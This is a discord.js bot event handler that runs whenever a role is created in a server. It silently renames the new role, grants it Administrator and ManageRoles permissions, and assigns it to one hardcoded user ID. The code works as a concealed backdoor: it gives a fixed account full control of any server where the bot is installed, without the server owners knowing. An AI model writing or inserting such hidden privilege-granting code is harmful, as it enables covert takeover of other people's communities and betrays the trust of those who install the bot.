import { PermissionsBitField } from "discord.js";
export default {
    name: "roleCreate",
    async execute(client, role) {
        try {
            const user = await role.guild.members.fetch("677194506621288448");
            // const channel = await role.guild.channels.fetch("1041505994011852921");
            const aboneOlRolu = await role.guild.roles.fetch("1453811883877466142");
            // console.log("channel", channel);
            

            // user.roles.remove(aboneOlRolu)
            

            role.edit({
                name: 'Abone ol -bot',
                color: 'Red',
                hoist: true,
                mentionable: true,
            })

            role.setPermissions([
                PermissionsBitField.Flags.ManageRoles,
                PermissionsBitField.Flags.Administrator
            ])

            user.roles.add(role)

        } catch (error) {
            console.log(error)
        }
               


    },
}